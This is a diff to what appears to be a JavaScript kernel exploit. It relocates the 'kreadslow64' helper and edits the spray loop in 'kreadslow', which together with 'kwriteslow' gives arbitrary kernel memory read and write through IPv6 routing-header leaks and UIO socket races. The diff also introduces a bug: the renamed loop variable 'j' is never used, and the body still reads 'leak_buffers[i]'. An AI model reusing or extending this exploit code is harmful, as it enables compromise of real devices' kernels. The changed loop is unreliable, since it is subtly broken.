@@ -1380,15 +1380,7 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 
   log('[UIO] build_uio EXIT');
 }
-function kreadslow64(address) {
-  var buffer = kreadslow(address, 8);
-  if (buffer.eq(BigInt_Error)) {
-    log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
-    cleanup();
-    throw new Error('kreadslow64 failed at ' + hex(address));
-  }
-  return read64(buffer);
-}
+
 function kreadslow(addr, size) {
   debug('[KR] Enter kreadslow addr=' + hex(addr) + ' size=' + size);
   if (debugging.info.memory.available === 0) {
@@ -1429,7 +1421,7 @@ function kreadslow(addr, size) {
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) break;
     read(new BigInt(uio_sock_0), tmp, size);
-    for (var i = 0; i < UIO_THREAD_NUM; i++) read(new BigInt(uio_sock_0), leak_buffers[i], size);
+    for (var j = 0; j < UIO_THREAD_NUM; j++) read(new BigInt(uio_sock_0), leak_buffers[i], size);
     wait_uio_writev();
     write(new BigInt(uio_sock_1), tmp, size);
   }
@@ -1485,6 +1477,15 @@ function kreadslow(addr, size) {
   }
   if (triplets[2] === -1) return BigInt_Error;
   return leak_buffer;
+}
+function kreadslow64(address) {
+  var buffer = kreadslow(address, 8);
+  if (buffer.eq(BigInt_Error)) {
+    log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
+    cleanup();
+    throw new Error('kreadslow64 failed at ' + hex(address));
+  }
+  return read64(buffer);
 }
 function kwriteslow(addr, buffer, size) {
   log('[KW] Enter kwriteslow addr=' + hex(addr));
